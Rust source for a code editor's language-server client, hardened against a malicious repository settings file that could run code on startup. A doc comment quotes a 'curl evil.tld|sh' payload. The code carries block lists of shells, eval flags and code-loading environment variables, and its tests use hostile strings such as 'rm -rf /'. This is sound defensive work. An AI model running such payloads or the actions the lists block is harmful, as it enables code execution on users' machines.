use std::collections::HashMap;
use std::ffi::OsString;
use std::io::{BufRead, BufReader, BufWriter, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{mpsc, Arc, Mutex};
use std::thread::JoinHandle;

use std::process::ChildStderr;

use lsp_types::{
    ClientCapabilities, DidChangeTextDocumentParams, DidCloseTextDocumentParams,
    DidOpenTextDocumentParams, DocumentSymbolClientCapabilities, DocumentSymbolParams,
    DynamicRegistrationClientCapabilities, GotoCapability, GotoDefinitionParams,
    HoverClientCapabilities, HoverParams, InitializeParams, MarkupKind, Position,
    PublishDiagnosticsClientCapabilities, ReferenceContext, ReferenceParams, ServerCapabilities,
    TextDocumentClientCapabilities, TextDocumentContentChangeEvent, TextDocumentIdentifier,
    TextDocumentItem, TextDocumentPositionParams, TextDocumentSyncClientCapabilities, Uri,
    VersionedTextDocumentIdentifier, WorkspaceFolder,
};
use std::str::FromStr;

/// A message received from the language server.
#[derive(Debug, Clone)]
pub(crate) enum LspMessage {
    /// A response to a request we sent.
    Response {
        id: u64,
        result: Option<serde_json::Value>,
        error: Option<serde_json::Value>,
    },
    /// A server-initiated request (has id and method, expects a response).
    Request {
        id: u64,
        method: String,
        #[allow(dead_code)]
        params: serde_json::Value,
    },
    /// A notification from the server (no id).
    Notification {
        method: String,
        params: serde_json::Value,
    },
    /// The reader thread encountered an error or the server exited.
    ServerExited(String),
}

/// A running LSP client connected to a single language server process.
#[allow(dead_code)]
pub(crate) struct LspClient {
    /// The server config name (for logging).
    pub name: String,
    /// The project root this server was initialized with.
    pub root: PathBuf,
    /// Writer to server stdin (behind Mutex for thread safety).
    writer: Arc<Mutex<BufWriter<std::process::ChildStdin>>>,
    /// Receiver for messages from the reader thread.
    pub rx: mpsc::Receiver<LspMessage>,
    /// Auto-incrementing request ID.
    next_id: AtomicU64,
    /// The server process (kept alive; dropped on shutdown).
    process: Arc<Mutex<Option<Child>>>,
    /// The reader thread handle.
    _reader_thread: JoinHandle<()>,
    /// Server capabilities received from initialize response.
    pub capabilities: Option<ServerCapabilities>,
    /// Files currently open (URI -> version).
    open_files: HashMap<String, i32>,
}

/// Read and log stderr lines from an LSP server process.
fn drain_stderr(name: String, stderr: ChildStderr) {
    let reader = BufReader::new(stderr);
    for line in reader.lines() {
        match line {
            Ok(l) => log::debug!("[lsp:{}:stderr] {}", name, l),
            Err(_) => break,
        }
    }
}

/// Read JSON-RPC messages from stdout and forward them via the channel.
fn drain_stdout(name: String, stdout: std::process::ChildStdout, tx: mpsc::Sender<LspMessage>) {
    let mut reader = BufReader::new(stdout);
    loop {
        match read_lsp_message(&mut reader) {
            Ok(Some(msg)) => {
                if tx.send(msg).is_err() {
                    break;
                }
            }
            Ok(None) => {
                let _ = tx.send(LspMessage::ServerExited(format!(
                    "{} exited normally",
                    name
                )));
                break;
            }
            Err(e) => {
                let _ = tx.send(LspMessage::ServerExited(format!(
                    "{} read error: {}",
                    name, e
                )));
                break;
            }
        }
    }
}

#[allow(dead_code)]
impl LspClient {
    /// Spawn a language server process and start the reader thread.
    /// Does NOT send `initialize` yet — call `initialize()` after construction.
    pub fn spawn(
        name: &str,
        command: &str,
        args: &[String],
        env: &[String],
        root: &Path,
        shell_init: &str,
    ) -> Result<Self, String> {
        // `command`, `args` and `env` all come from settings.json, which may
        // ship with a cloned repository. Validate every one of them before a
        // process exists — see `is_safe_command_name` / `is_safe_arg`.
        if !is_safe_command_name(command) {
            let msg = format!(
                "refusing to start LSP server '{}': unsafe command {:?}",
                name, command
            );
            log::warn!("[lsp] {}", msg);
            return Err(msg);
        }
        if let Some(bad) = args.iter().find(|a| !is_safe_arg(a)) {
            let msg = format!(
                "refusing to start LSP server '{}': argument {:?} makes the program \
                 execute an argument as code",
                name, bad
            );
            log::warn!("[lsp] {}", msg);
            return Err(msg);
        }

        // Resolve command path via shell (handles GUI-app PATH issues on macOS).
        let resolved_cmd = resolve_command(command, shell_init)
            .ok_or_else(|| format!("LSP server '{}' not found: {}", name, command))?;

        let mut cmd = Command::new(&resolved_cmd);
        cmd.args(args)
            .current_dir(root)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        // `PATH` is Dirigent's, never the repository's — see `composed_path`.
        // Set before the settings loop so nothing can be layered on top of it.
        if let Some(path) = composed_path(&resolved_cmd) {
            cmd.env("PATH", path);
        }

        // Apply environment variables.
        // Split on newlines to handle legacy entries where multiple KEY=VALUE
        // pairs were collapsed into a single string (join/split mismatch bug).
        for pair in env {
            for line in pair.split('\n') {
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }
                if let Some((k, v)) = line.split_once('=') {
                    let k = k.trim();
                    // The `command` field is validated by `is_safe_command_name`
                    // because settings.json may be attacker-controlled (a malicious
                    // `.Dirigent/settings.json` in a repo). The `env` field is the
                    // same trust boundary: without this check it silently bypasses
                    // that protection, since one interpreter hook (`NODE_OPTIONS`,
                    // `PYTHONSTARTUP`, `RUBYOPT`, `LD_PRELOAD`, ...) is arbitrary
                    // code execution the moment the server spawns. Only names on
                    // the `SAFE_ENV_NAMES` allowlist get through.
                    if !is_safe_env_name(k) {
                        log::warn!(
                            "[lsp] refusing to set environment variable {:?} for server '{}': \
                             not on the allowlist of variables that cannot influence what \
                             the server loads or executes",
                            k,
                            name
                        );
                        continue;
                    }
                    cmd.env(k, v.trim());
                }
            }
        }

        let mut child = cmd.spawn().map_err(|e| {
            format!(
                "Failed to spawn LSP server '{}' ({}): {}",
                name, resolved_cmd, e
            )
        })?;

        let stdin = child.stdin.take().ok_or("Failed to capture LSP stdin")?;
        let stdout = child.stdout.take().ok_or("Failed to capture LSP stdout")?;

        let writer = Arc::new(Mutex::new(BufWriter::new(stdin)));
        let (tx, rx) = mpsc::channel();
        let server_name = name.to_string();

        // Spawn stderr reader (just log to eprintln for now)
        if let Some(stderr) = child.stderr.take() {
            let name_clone = server_name.clone();
            std::thread::spawn(move || drain_stderr(name_clone, stderr));
        }

        // Spawn stdout reader: parse JSON-RPC messages
        let reader_thread = {
            let name_clone = server_name.clone();
            std::thread::spawn(move || drain_stdout(name_clone, stdout, tx))
        };

        let process = Arc::new(Mutex::new(Some(child)));

        Ok(LspClient {
            name: name.to_string(),
            root: root.to_path_buf(),
            writer,
            rx,
            next_id: AtomicU64::new(1),
            process,
            _reader_thread: reader_thread,
            capabilities: None,
            open_files: HashMap::new(),
        })
    }

    /// Send the `initialize` request. Returns the request ID.
    #[allow(deprecated)]
    pub fn initialize(&self) -> u64 {
        let root_uri = file_uri(&self.root);

        let params = InitializeParams {
            process_id: Some(std::process::id()),
            root_uri: Some(root_uri.clone()),
            capabilities: ClientCapabilities {
                text_document: Some(TextDocumentClientCapabilities {
                    hover: Some(HoverClientCapabilities {
                        dynamic_registration: Some(false),
                        content_format: Some(vec![MarkupKind::PlainText, MarkupKind::Markdown]),
                    }),
                    definition: Some(GotoCapability {
                        dynamic_registration: Some(false),
                        link_support: Some(false),
                    }),
                    references: Some(DynamicRegistrationClientCapabilities {
                        dynamic_registration: Some(false),
                    }),
                    document_symbol: Some(DocumentSymbolClientCapabilities {
                        dynamic_registration: Some(false),
                        ..Default::default()
                    }),
                    synchronization: Some(TextDocumentSyncClientCapabilities {
                        dynamic_registration: Some(false),
                        will_save: Some(false),
                        will_save_wait_until: Some(false),
                        did_save: Some(true),
                    }),
                    publish_diagnostics: Some(PublishDiagnosticsClientCapabilities {
                        related_information: Some(true),
                        ..Default::default()
                    }),
                    ..Default::default()
                }),
                ..Default::default()
            },
            workspace_folders: Some(vec![WorkspaceFolder {
                uri: root_uri,
                name: self
                    .root
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default(),
            }]),
            ..Default::default()
        };

        self.send_request(
            "initialize",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        )
    }

    /// Send the `initialized` notification (must be called after receiving initialize response).
    pub fn initialized(&self) {
        self.send_notification("initialized", serde_json::json!({}));
    }

    /// Send `textDocument/didOpen` for a file.
    pub fn did_open(&mut self, file_path: &Path) {
        let uri = file_uri(file_path);
        let uri_str = uri.as_str().to_string();

        // Don't re-open if already tracked
        if self.open_files.contains_key(&uri_str) {
            return;
        }

        let content = match std::fs::read_to_string(file_path) {
            Ok(c) => c,
            Err(_) => return,
        };

        let language_id = language_id_from_path(file_path);

        let params = DidOpenTextDocumentParams {
            text_document: TextDocumentItem {
                uri,
                language_id,
                version: 1,
                text: content,
            },
        };

        self.send_notification(
            "textDocument/didOpen",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        );
        self.open_files.insert(uri_str, 1);
    }

    /// Send `textDocument/didClose` for a file.
    pub fn did_close(&mut self, file_path: &Path) {
        let uri = file_uri(file_path);
        let uri_str = uri.as_str().to_string();

        if self.open_files.remove(&uri_str).is_none() {
            return; // wasn't open
        }

        let params = DidCloseTextDocumentParams {
            text_document: TextDocumentIdentifier { uri },
        };

        self.send_notification(
            "textDocument/didClose",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        );
    }

    /// Send `textDocument/didChange` for a file (full content sync).
    pub fn did_change(&mut self, file_path: &Path) {
        let uri = file_uri(file_path);
        let uri_str = uri.as_str().to_string();

        // Ensure didOpen has been sent before any didChange
        if !self.open_files.contains_key(&uri_str) {
            self.did_open(file_path);
            // did_open may fail (e.g. unreadable file) — check again
            if !self.open_files.contains_key(&uri_str) {
                return;
            }
        }

        let content = match std::fs::read_to_string(file_path) {
            Ok(c) => c,
            Err(_) => return,
        };

        let Some(version) = self.open_files.get_mut(&uri_str) else {
            return;
        };
        *version += 1;
        let ver = *version;

        let params = DidChangeTextDocumentParams {
            text_document: VersionedTextDocumentIdentifier { uri, version: ver },
            content_changes: vec![TextDocumentContentChangeEvent {
                range: None,
                range_length: None,
                text: content,
            }],
        };

        self.send_notification(
            "textDocument/didChange",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        );
    }

    /// Request `textDocument/hover`.
    pub fn hover(&self, file_path: &Path, line: u32, character: u32) -> u64 {
        let uri = file_uri(file_path);
        let params = HoverParams {
            text_document_position_params: TextDocumentPositionParams {
                text_document: TextDocumentIdentifier { uri },
                position: Position { line, character },
            },
            work_done_progress_params: Default::default(),
        };
        self.send_request(
            "textDocument/hover",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        )
    }

    /// Request `textDocument/definition`.
    pub fn definition(&self, file_path: &Path, line: u32, character: u32) -> u64 {
        let uri = file_uri(file_path);
        let params = GotoDefinitionParams {
            text_document_position_params: TextDocumentPositionParams {
                text_document: TextDocumentIdentifier { uri },
                position: Position { line, character },
            },
            work_done_progress_params: Default::default(),
            partial_result_params: Default::default(),
        };
        self.send_request(
            "textDocument/definition",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        )
    }

    /// Request `textDocument/documentSymbol`.
    pub fn document_symbols(&self, file_path: &Path) -> u64 {
        let uri = file_uri(file_path);
        let params = DocumentSymbolParams {
            text_document: TextDocumentIdentifier { uri },
            work_done_progress_params: Default::default(),
            partial_result_params: Default::default(),
        };
        self.send_request(
            "textDocument/documentSymbol",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        )
    }

    /// Request `textDocument/references`.
    pub fn references(&self, file_path: &Path, line: u32, character: u32) -> u64 {
        let uri = file_uri(file_path);
        let params = ReferenceParams {
            text_document_position: TextDocumentPositionParams {
                text_document: TextDocumentIdentifier { uri },
                position: Position { line, character },
            },
            context: ReferenceContext {
                include_declaration: true,
            },
            work_done_progress_params: Default::default(),
            partial_result_params: Default::default(),
        };
        self.send_request(
            "textDocument/references",
            serde_json::to_value(params).expect("LSP params must be serializable"),
        )
    }

    /// Send `shutdown` request and then `exit` notification.
    pub fn shutdown(&self) -> u64 {
        self.send_request("shutdown", serde_json::Value::Null)
    }

    /// Send `exit` notification (call after shutdown response).
    pub fn exit(&self) {
        self.send_notification("exit", serde_json::Value::Null);
    }

    /// Kill the server process.
    pub fn kill(&self) {
        if let Ok(mut guard) = self.process.lock() {
            if let Some(ref mut child) = *guard {
                let _ = child.kill();
            }
        }
    }

    /// Check if the server process is still running.
    pub fn is_alive(&self) -> bool {
        if let Ok(mut guard) = self.process.lock() {
            if let Some(ref mut child) = *guard {
                return child.try_wait().ok().flatten().is_none();
            }
        }
        false
    }

    // -- Internal helpers --

    fn send_request(&self, method: &str, params: serde_json::Value) -> u64 {
        let id = self.next_id.fetch_add(1, Ordering::Relaxed);
        let msg = serde_json::json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": method,
            "params": params,
        });
        self.write_message(&msg);
        id
    }

    fn send_notification(&self, method: &str, params: serde_json::Value) {
        let msg = serde_json::json!({
            "jsonrpc": "2.0",
            "method": method,
            "params": params,
        });
        self.write_message(&msg);
    }

    fn write_message(&self, msg: &serde_json::Value) {
        let body = serde_json::to_string(msg).expect("LSP message must be serializable");
        let mut writer = match self.writer.lock() {
            Ok(w) => w,
            Err(e) => {
                log::error!("[lsp] failed to acquire writer lock: {e}");
                return;
            }
        };
        let header = format!("Content-Length: {}\r\n\r\n", body.len());
        if let Err(e) = writer.write_all(header.as_bytes()) {
            log::error!("[lsp] failed to write header: {e}");
            return;
        }
        if let Err(e) = writer.write_all(body.as_bytes()) {
            log::error!("[lsp] failed to write body: {e}");
            return;
        }
        if let Err(e) = writer.flush() {
            log::error!("[lsp] failed to flush: {e}");
        }
    }
}

impl Drop for LspClient {
    fn drop(&mut self) {
        // Best-effort graceful shutdown
        self.shutdown();
        std::thread::sleep(std::time::Duration::from_millis(100));
        self.exit();
        self.kill();
    }
}

/// Read a single LSP JSON-RPC message from the stream.
/// Returns None on EOF.
fn read_lsp_message<R: BufRead>(reader: &mut R) -> Result<Option<LspMessage>, String> {
    // Read headers
    let mut content_length: Option<usize> = None;
    loop {
        let mut header_line = String::new();
        let bytes_read = reader
            .read_line(&mut header_line)
            .map_err(|e| e.to_string())?;
        if bytes_read == 0 {
            return Ok(None); // EOF
        }
        let trimmed = header_line.trim();
        if trimmed.is_empty() {
            break; // End of headers
        }
        if let Some(len_str) = trimmed.strip_prefix("Content-Length:") {
            content_length = len_str.trim().parse().ok();
        }
    }

    let length = content_length.ok_or("Missing Content-Length header")?;

    // Read body
    let mut body = vec![0u8; length];
    reader
        .read_exact(&mut body)
        .map_err(|e| format!("Failed to read LSP body: {}", e))?;

    let json: serde_json::Value =
        serde_json::from_slice(&body).map_err(|e| format!("Invalid LSP JSON: {}", e))?;

    // Distinguish response vs notification
    if let Some(id) = json.get("id") {
        // It's a response (has "id" and either "result" or "error")
        if json.get("method").is_some() {
            // Server-initiated request (e.g. window/showMessageRequest) — preserve id so callers can respond
            Ok(Some(LspMessage::Request {
                id: id.as_u64().unwrap_or(0),
                method: json["method"].as_str().unwrap_or("").to_string(),
                params: json
                    .get("params")
                    .cloned()
                    .unwrap_or(serde_json::Value::Null),
            }))
        } else {
            Ok(Some(LspMessage::Response {
                id: id.as_u64().unwrap_or(0),
                result: json.get("result").cloned(),
                error: json.get("error").cloned(),
            }))
        }
    } else {
        // Notification
        Ok(Some(LspMessage::Notification {
            method: json["method"].as_str().unwrap_or("").to_string(),
            params: json
                .get("params")
                .cloned()
                .unwrap_or(serde_json::Value::Null),
        }))
    }
}

/// Programs that run code handed to them as an argument: shells, interpreters,
/// and the wrappers (`env`, `xargs`, `nohup`, ...) that exist to launch them.
///
/// Character-level validation of `command` alone is not enough, because `args`
/// is passed to the process verbatim and comes from the same file. A repository
/// shipping `{"lsp_enabled": true, "lsp_servers": [{"command": "/bin/sh",
/// "args": ["-c", "curl evil.tld|sh"]}]}` would otherwise execute arbitrary
/// code the moment it is opened — `start_servers` runs from `DirigentApp::new`,
/// with no user interaction. A language server is always a long-lived binary
/// speaking JSON-RPC over stdio, never an interpreter invocation, so refusing
/// these names costs nothing legitimate.
const CODE_EXECUTING_PROGRAMS: &[&str] = &[
    // Shells.
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "mksh",
    "csh",
    "tcsh",
    "fish",
    "ash",
    "busybox",
    "pwsh",
    "powershell",
    // Wrappers whose whole job is to exec whatever they are handed.
    "env",
    "xargs",
    "nohup",
    "setsid",
    "stdbuf",
    "nice",
    "timeout",
    "script",
    "sudo",
    "doas",
    "open",
    // Interpreters and language runtimes.
    "node",
    "nodejs",
    "deno",
    "bun",
    "python",
    "pypy",
    "ruby",
    "perl",
    "php",
    "lua",
    "luajit",
    "tclsh",
    "wish",
    "osascript",
    "awk",
    "gawk",
    "mawk",
    "nawk",
    "sed",
    "groovy",
    "scala",
    "jshell",
    "irb",
    "elixir",
    "iex",
    "erl",
    "escript",
    "java",
    "swift",
    "ghci",
    "runghc",
    "runhaskell",
    "rscript",
    "r",
    "julia",
    "guile",
    "emacs",
    "vim",
];

/// Flags that make a program treat an argument as code rather than data.
///
/// Second line of defence behind [`CODE_EXECUTING_PROGRAMS`]: it catches an
/// interpreter that reaches `spawn` under a name not on that list (a wrapper
/// script, a vendored binary, a language runtime we did not enumerate).
/// Real language servers take flags like `--stdio`, `--languageserver` or a
/// data directory — never an eval flag.
const CODE_EXECUTING_FLAGS: &[&str] = &[
    "-c",     // sh/bash/zsh/python/ruby/php: run the next argument
    "-e",     // perl/ruby/node/sed: evaluate
    "-E",     // perl: evaluate with features enabled
    "--eval", // node/deno/bun/php/emacs
    "--eval-file",
    "--execute",
    "-execute",
    "--exec",
    "-exec", // find(1)
    "--command",
    "-command",
    "--expression",
    "-expression",
];

/// The lowercased program name a command path refers to
/// (`/usr/bin/python3.12` -> `python3.12`).
fn program_basename(command: &str) -> String {
    Path::new(command)
        .file_name()
        .map(|n| n.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
}

/// Returns `true` if `name` is safe to spawn as a language server.
///
/// Two rules, both required:
/// 1. Only characters safe for shell interpolation (alphanumeric, hyphen,
///    underscore, dot, forward slash) — rejects `;`, `|`, `$`, backtick, etc.,
///    since [`resolve_command`] falls back to a login-shell `which`.
/// 2. The program is not a shell, interpreter, or exec wrapper
///    ([`CODE_EXECUTING_PROGRAMS`]), which would turn `args` into a
///    code-execution channel.
fn is_safe_command_name(name: &str) -> bool {
    if name.is_empty()
        || !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
    {
        return false;
    }
    let base = program_basename(name);
    // Also compare without a trailing version suffix, so `python3.12` and
    // `perl5.34` are caught by the `python` / `perl` entries.
    let unversioned = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    !CODE_EXECUTING_PROGRAMS
        .iter()
        .any(|p| *p == base || *p == unversioned)
}

/// Returns `true` if `arg` is safe to pass to a language server process.
///
/// Rejects eval-style flags in both spellings a program may accept them in
/// (`--eval CODE` and `--eval=CODE`).
fn is_safe_arg(arg: &str) -> bool {
    let flag = arg.split('=').next().unwrap_or(arg);
    !CODE_EXECUTING_FLAGS.contains(&flag)
}

/// Environment variables a language server may be given from settings.
///
/// This is an allowlist, and it must stay one. Blocking the names that are
/// known to be dangerous does not work: far too many variables are an
/// arbitrary-code hook for some runtime, and the servers Dirigent ships
/// presets for are written in exactly the languages that have them —
/// `NODE_OPTIONS=--require /repo/evil.js` (typescript-language-server),
/// `PYTHONSTARTUP` / `PYTHONPATH` (pylsp, pyright), `RUBYOPT` (solargraph),
/// `PERL5OPT`, `BASH_ENV` / `ENV` for anything that shells out,
/// `GIT_SSH_COMMAND` for anything that runs `git`, and the dynamic-linker
/// variables (`DYLD_*`, `LD_*`) for everything. `PATH` is worse still: it
/// redirects every binary the server itself spawns, so it is composed by
/// Dirigent (see [`composed_path`]) and never taken from settings.
///
/// Entries below are limited to locale, terminal presentation, log verbosity
/// and pure data/cache directories. A name belongs here only if its value can
/// never be interpreted as code, a library to load, or a program to run —
/// which rules out toolchain selectors (`JAVA_HOME`, `RUSTUP_TOOLCHAIN`,
/// `VIRTUAL_ENV`), wrapper hooks (`RUSTC_WRAPPER`, `GOFLAGS`) and anything
/// that redirects a download (`GOPROXY`, `*_PROXY`).
const SAFE_ENV_NAMES: &[&str] = &[
    // Locale and terminal presentation.
    "LANG",
    "LANGUAGE",
    "LC_ALL",
    "LC_CTYPE",
    "LC_MESSAGES",
    "LC_NUMERIC",
    "LC_TIME",
    "TZ",
    "TERM",
    "COLUMNS",
    "LINES",
    // Colour toggles.
    "NO_COLOR",
    "CLICOLOR",
    "CLICOLOR_FORCE",
    "FORCE_COLOR",
    // Log verbosity knobs understood by various servers.
    "LOG_LEVEL",
    "LOGLEVEL",
    "LSP_LOG_LEVEL",
    "RUST_LOG",
    "RUST_BACKTRACE",
    "RA_LOG",
    // Data and cache directories (contents are read, never executed).
    "CARGO_TARGET_DIR",
    "GOPATH",
    "GOCACHE",
    "GOMODCACHE",
    "GO111MODULE",
];

/// Returns `true` if `name` may be set from settings for a spawned language
/// server — that is, if it is on the [`SAFE_ENV_NAMES`] allowlist.
///
/// The match is exact. Case-insensitive matching would let `path` through on
/// platforms where the environment is case-insensitive, and a lowercase
/// spelling of an allowlisted name is not read by anything anyway.
fn is_safe_env_name(name: &str) -> bool {
    SAFE_ENV_NAMES.contains(&name)
}

/// Build the `PATH` for a spawned language server.
///
/// Composed by Dirigent rather than taken from settings: `PATH` decides which
/// binary every process the server spawns resolves to (`gopls` runs `go`,
/// solargraph runs `ruby`, jdtls runs `java`), so accepting it from a
/// repository's `.Dirigent/settings.json` is arbitrary code execution with
/// extra steps. Dirigent's own `PATH` is used, with the directory the server
/// binary was resolved from in front so a toolchain-local server finds its
/// siblings first.
fn composed_path(resolved_cmd: &str) -> Option<OsString> {
    let inherited = std::env::var_os("PATH").unwrap_or_default();
    let mut dirs: Vec<PathBuf> = Vec::new();
    if let Some(parent) = Path::new(resolved_cmd).parent() {
        if !parent.as_os_str().is_empty() {
            dirs.push(parent.to_path_buf());
        }
    }
    for dir in std::env::split_paths(&inherited) {
        if !dirs.contains(&dir) {
            dirs.push(dir);
        }
    }
    std::env::join_paths(dirs).ok()
}

/// Resolve a command name using the login shell (handles macOS GUI PATH issues).
fn resolve_command(command: &str, shell_init: &str) -> Option<String> {
    // Reject command names with shell metacharacters to prevent command injection.
    // The command field comes from settings.json which may be attacker-controlled
    // (e.g. a malicious .Dirigent/settings.json checked into a repository).
    if !is_safe_command_name(command) {
        log::warn!(
            "[lsp] refusing to resolve command with unsafe characters: {:?}",
            command
        );
        return None;
    }

    // If it's already an absolute path, use it directly
    if Path::new(command).is_absolute() {
        if Path::new(command).exists() {
            return Some(command.to_string());
        }
        return None;
    }

    // Try which crate first
    if let Ok(path) = which::which(command) {
        return Some(path.to_string_lossy().to_string());
    }

    // Fall back to login shell resolution (for macOS GUI apps)
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
    let script = if shell_init.is_empty() {
        format!("which {}", command)
    } else {
        format!("{}; which {}", shell_init, command)
    };
    let output = Command::new(&shell)
        .args(["-l", "-c", &script])
        .output()
        .ok()?;
    if output.status.success() {
        let path = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !path.is_empty() && Path::new(&path).exists() {
            return Some(path);
        }
    }
    None
}

/// Convert a file system path to an LSP `Uri` (file:// scheme).
fn file_uri(path: &Path) -> Uri {
    let abs = if path.is_absolute() {
        path.to_path_buf()
    } else {
        std::env::current_dir().unwrap_or_default().join(path)
    };
    // Canonicalize to resolve `.`, `..`, and duplicate separators.
    // Fall back to the absolute path if canonicalize fails (e.g. file doesn't exist yet).
    let canonical = abs.canonicalize().unwrap_or(abs);
    let url = url::Url::from_file_path(&canonical)
        .expect("Url::from_file_path should not fail for an absolute path");
    Uri::from_str(url.as_str()).expect("a valid file:// URL should parse as Uri")
}

/// Map a file extension to an LSP language identifier.
fn language_id_from_path(path: &Path) -> String {
    let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
    match ext {
        "rs" => "rust",
        "ts" => "typescript",
        "tsx" => "typescriptreact",
        "js" => "javascript",
        "jsx" => "javascriptreact",
        "py" => "python",
        "go" => "go",
        "java" => "java",
        "c" => "c",
        "cpp" | "cc" | "cxx" => "cpp",
        "h" => "c",
        "hpp" | "hxx" => "cpp",
        "rb" => "ruby",
        "swift" => "swift",
        "kt" | "kts" => "kotlin",
        "cs" => "csharp",
        "lua" => "lua",
        "zig" => "zig",
        "toml" => "toml",
        "yaml" | "yml" => "yaml",
        "json" => "json",
        "html" => "html",
        "css" => "css",
        "scss" => "scss",
        "sh" | "bash" | "zsh" => "shellscript",
        _ => ext,
    }
    .to_string()
}

#[cfg(test)]
mod tests {
    use super::{is_safe_arg, is_safe_command_name, is_safe_env_name, LspClient};

    #[test]
    fn rejects_command_names_with_shell_metacharacters() {
        assert!(is_safe_command_name("rust-analyzer"));
        assert!(is_safe_command_name("/usr/local/bin/pyright-langserver"));
        assert!(!is_safe_command_name("sh -c evil"));
        assert!(!is_safe_command_name("evil;rm -rf /"));
        assert!(!is_safe_command_name("$(payload)"));
        assert!(!is_safe_command_name(""));
    }

    #[test]
    fn rejects_shells_and_interpreters_as_the_command() {
        // These pass the character allowlist but execute whatever `args` says,
        // so permitting them makes `args` a code-execution channel.
        for evil in [
            "/bin/sh",
            "sh",
            "bash",
            "/bin/zsh",
            "/usr/bin/env",
            "node",
            "python3",
            "/usr/bin/python3.12",
            "perl5.34",
            "ruby",
            "php",
            "osascript",
            "java",
            "xargs",
            "nohup",
            "/usr/bin/open",
        ] {
            assert!(!is_safe_command_name(evil), "{evil} must be rejected");
        }

        // Real language servers must keep working.
        for ok in [
            "rust-analyzer",
            "clangd",
            "gopls",
            "pylsp",
            "typescript-language-server",
            "lua-language-server",
            "elixir-ls",
            "sourcekit-lsp",
            "OmniSharp",
            "zls",
            "/opt/homebrew/bin/jdtls",
        ] {
            assert!(is_safe_command_name(ok), "{ok} must be allowed");
        }
    }

    #[test]
    fn rejects_arguments_that_execute_code() {
        for evil in [
            "-c",
            "-e",
            "-E",
            "--eval",
            "--eval=1+1",
            "--eval-file",
            "-exec",
            "--exec=payload",
            "--command",
            "-command",
            "--expression",
        ] {
            assert!(!is_safe_arg(evil), "{evil} must be rejected");
        }

        // Ordinary language server arguments.
        for ok in [
            "--stdio",
            "stdio",
            "--languageserver",
            "--log-level=debug",
            "-data",
            "/Users/me/.cache/jdtls",
            "--clang-tidy",
            "",
        ] {
            assert!(is_safe_arg(ok), "{ok:?} must be allowed");
        }
    }

    #[test]
    fn spawn_refuses_the_shell_payload_without_running_it() {
        // End-to-end regression for the startup RCE: a cloned repository whose
        // `.Dirigent/settings.json` sets `{"command": "/bin/sh", "args":
        // ["-c", "..."]}` must not get a process, since `start_servers` runs
        // from `DirigentApp::new()` with no user interaction.
        let dir = tempfile::tempdir().unwrap();
        let canary = dir.path().join("pwned");
        let payload = format!("touch {}", canary.display());

        let Err(err) = LspClient::spawn(
            "evil",
            "/bin/sh",
            &["-c".to_string(), payload.clone()],
            &[],
            dir.path(),
            "",
        ) else {
            panic!("spawning /bin/sh must be refused");
        };
        assert!(err.contains("unsafe command"), "unexpected error: {err}");
        assert!(!canary.exists(), "payload ran");

        // And again with a command that is not itself a shell, to prove the
        // argument check is a second, independent gate.
        let Err(err) = LspClient::spawn(
            "evil",
            "rust-analyzer",
            &["-c".to_string(), payload],
            &[],
            dir.path(),
            "",
        ) else {
            panic!("an eval-style argument must be refused");
        };
        assert!(
            err.contains("execute an argument"),
            "unexpected error: {err}"
        );
        assert!(!canary.exists(), "payload ran");
    }

    #[test]
    fn rejects_dynamic_linker_env_vars() {
        // These would inject a shared library into the spawned server process,
        // giving a malicious `.Dirigent/settings.json` remote code execution.
        assert!(!is_safe_env_name("DYLD_INSERT_LIBRARIES"));
        assert!(!is_safe_env_name("dyld_insert_libraries"));
        assert!(!is_safe_env_name("LD_PRELOAD"));
        assert!(!is_safe_env_name("LD_AUDIT"));
        assert!(!is_safe_env_name("LD_LIBRARY_PATH"));
        assert!(!is_safe_env_name("DYLD_LIBRARY_PATH"));
    }

    #[test]
    fn rejects_interpreter_hook_env_vars() {
        // Every one of these makes a runtime execute a file named by the
        // variable, and each targets a language Dirigent ships an LSP preset
        // for. A blocklist of `DYLD_*` / `LD_*` let all of them through.
        for evil in [
            // Node — typescript-language-server, and any node-based server.
            "NODE_OPTIONS",
            "NODE_REPL_EXTERNAL_MODULE",
            "NODE_EXTRA_CA_CERTS",
            // Python — pylsp, pyright.
            "PYTHONSTARTUP",
            "PYTHONPATH",
            "PYTHONHOME",
            "PYTHONEXECUTABLE",
            // Ruby — solargraph.
            "RUBYOPT",
            "RUBYLIB",
            // Perl.
            "PERL5OPT",
            "PERL5LIB",
            // Shell hooks, for any server that shells out.
            "BASH_ENV",
            "ENV",
            "SHELLOPTS",
            "ZDOTDIR",
            // Anything that runs `git`.
            "GIT_SSH_COMMAND",
            "GIT_EXTERNAL_DIFF",
            "GIT_PAGER",
            // Toolchain selectors: point at a directory with a fake binary.
            "JAVA_HOME",
            "JAVA_TOOL_OPTIONS",
            "RUSTUP_TOOLCHAIN",
            "RUSTC_WRAPPER",
            "VIRTUAL_ENV",
            "GOFLAGS",
            "GOPROXY",
        ] {
            assert!(!is_safe_env_name(evil), "{evil} must be rejected");
        }
    }

    #[test]
    fn rejects_path_from_settings() {
        // PATH redirects every binary the server itself spawns (gopls -> go,
        // solargraph -> ruby, jdtls -> java). Dirigent composes it instead.
        assert!(!is_safe_env_name("PATH"));
        assert!(!is_safe_env_name("path"));
        assert!(!is_safe_env_name("Path"));
    }

    #[test]
    fn allows_ordinary_env_vars() {
        assert!(is_safe_env_name("RUST_LOG"));
        assert!(is_safe_env_name("RUST_BACKTRACE"));
        assert!(is_safe_env_name("GOPATH"));
